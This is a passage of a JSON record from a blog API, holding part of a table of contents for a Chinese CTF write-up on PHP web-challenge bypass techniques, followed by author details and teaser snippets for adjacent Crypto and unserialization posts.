href=\"#24-stripos%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">24.stripos函数绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web130\"><span class=\"toc-text\">web130</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#25-substr%E6%88%AA%E5%8F%96%E7%BB%95%E8%BF%87-%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6\"><span class=\"toc-text\">25.substr截取绕过&amp;数据外带</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#26-SERVER-QUARY-STRING-%E5%92%8Cparse-str%E7%9A%84%E5%A6%99%E7%94%A8\"><span class=\"toc-text\">26.$_SERVER[QUARY_STRING]和parse_str的妙用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web134\"><span class=\"toc-text\">web134</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#27-ls-112-%E5%92%8C-ls-tee-114\"><span class=\"toc-text\">27.ls &gt; 112 和 ls |tee 114</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web136\"><span class=\"toc-text\">web136</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#28-%E9%80%9A%E8%BF%87call-user-func-%E8%B0%83%E7%94%A8%E7%B1%BB%E4%B8%AD%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">28.通过call_user_func()调用类中方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web137\"><span class=\"toc-text\">web137</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#29-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83\"><span class=\"toc-text\">29.弱类型比较</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web140\"><span class=\"toc-text\">web140</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#30-%E6%95%B0%E5%AD%97%E5%8F%AF%E4%BB%A5%E5%92%8C%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%BA%9B%E8%BF%90%E7%AE%97\"><span class=\"toc-text\">30.数字可以和命令进行一些运算</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web141\"><span class=\"toc-text\">web141</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web145\"><span class=\"toc-text\">web145</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#31-php%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4-create-function%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">31.php命名空间  &amp;  create_function函数注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">命名空间使用</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#create-function%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">create_function函数注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web147\"><span class=\"toc-text\">web147</span></a></li></ol></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Crypto","uid":"839c443677170baa42195892cea08ce8","slug":"Crypto","date":"2024-11-12T13:48:53.000Z","updated":"2024-11-12T13:52:10.148Z","comments":true,"path":"api/articles/Crypto.json","keywords":null,"cover":"/image/9.png","text":"Crypto加密算法的安全定义 1 JSFUCK 2 颜文字1 +[]]+(!![]+[])[+[]]+ 2 ((ﾟДﾟ)+’_’) [ (ﾟｰﾟ)+(ﾟｰﾟ)...","permalink":"/post/Crypto","photos":[],"count_time":{"symbolsCount":"7k","symbolsTime":"6 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":7,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"Crypto","slug":"Crypto","count":1,"path":"api/tags/Crypto.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"反序列化","uid":"e989353c677dc5e8d2584f5f2bf0b5e8","slug":"反序列化","date":"2024-11-12T13:36:33.000Z","updated":"2024-11-12T13:38:06.267Z","comments":true,"path":"api/articles/反序列化.json","keywords":null,"cover":"/image/6.png","text":"Unserialize前置知识 序列化后语句为 1a:3:{s:4:\"name\";s:8:\"John Doe\";s:3:\"age\";i:25;s:6:\"grad...","permalink":"/post/反序列化","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":7,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"ctf","slug":"ctf","count":7,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}